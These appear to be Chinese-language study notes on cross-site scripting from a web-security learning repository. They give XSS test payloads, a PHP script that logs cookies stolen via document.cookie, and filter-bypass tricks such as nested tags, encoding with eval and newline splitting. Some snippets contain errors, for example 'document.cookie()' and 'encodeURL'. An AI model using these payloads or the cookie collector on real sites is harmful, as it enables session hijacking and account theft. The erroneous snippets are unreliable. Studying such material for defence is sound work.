## Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)  
XSS是發生在前端的，讓瀏覽器去執行攻擊代碼。使用腳本附加在連結或文本中可以讀取本地cookie或者擷取封包, 常見的防禦手勢就是使用**http-only**來限制http protocol才能訪問cookie內容, 以及使用**https**安全協定!  
1. reflective xss (非持久型):  
Server 執行惡意腳本**立即**返回結果, 像是在link中加上script.  
2. stored xss (持久型):  
Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容   
3. DOM xss:  
在DOM元素中加入事件, 觸發script.  
注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  

### XSS Vulnerability exists?
這裡先不談XSS探針...  
我習慣直接注入sciprt語句作測試，常見語句如下:  
```js
<script>alert(/1/);<script>
<script>a=prompt;a(1)</script>
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">
<a href=1 onload=alert(1)>hi</a>
```
從上面我可以大致推斷攻擊代碼多為直接彈窗，或者觸發事件!  

### XSS and Cookie
Cookie format: ```key: value```  
當client端向server端發出請求時，server會回傳一個set-cookie的標頭  
```set-cookie(name, expires, path, domain, secure, httponly) // 除了name後面幾個參數不一定要給值```  
```expires```: 若未設定，則是**End of Browser Session**，瀏覽器一關閉就會刪除!  
```secure```: 限定在https中傳輸  
```httponly```: 限制js去存取cookie  
[cookie reference](https://www.csie.ntu.edu.tw/~r92092/html/tech/cookie.html)  
為了竊取cookie，我們通常會寫一個檔案去接收cookie，大致上觀念如下:  
```php
$cookie = $_GET['cookie'];
$log = fopen('hi.txt','a');
fwrite($log,$cookie);
```
之後我們只要構造攻擊中帶有cookie參數: ```cookie=document.cookie()```，便會在本地的hi.txt得到cookie.

### 常見限制 < 對抗手勢
* filter 對一些危險標籤做過濾  
  * 大小寫混用  
  * 一次過濾繞過 e.g.```<scr<script>ipt>```  
  * 不如換個方式不使用到限制字符 e.g.```<img src=1 onerror=alert(1)>```
* encode 轉譯危險標籤  
  * url encode: % + ASCII(hex) ```%3Cscript%3E```  
  補充js常見處理函式: ```escape()/unescape(), encodeURL()/decodeURL(), encodeURLComponent()/decodeURLComponent()```  
  * html encode  
  * unicode encode: %u + ASCII(hex)  
  * ascii encode  
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  * 外部引入自己的script ```<script src=".js"></script>```  
* 未過濾\n類符號  
```js
<img src="javvas
cript:
alert(/1/);">
```
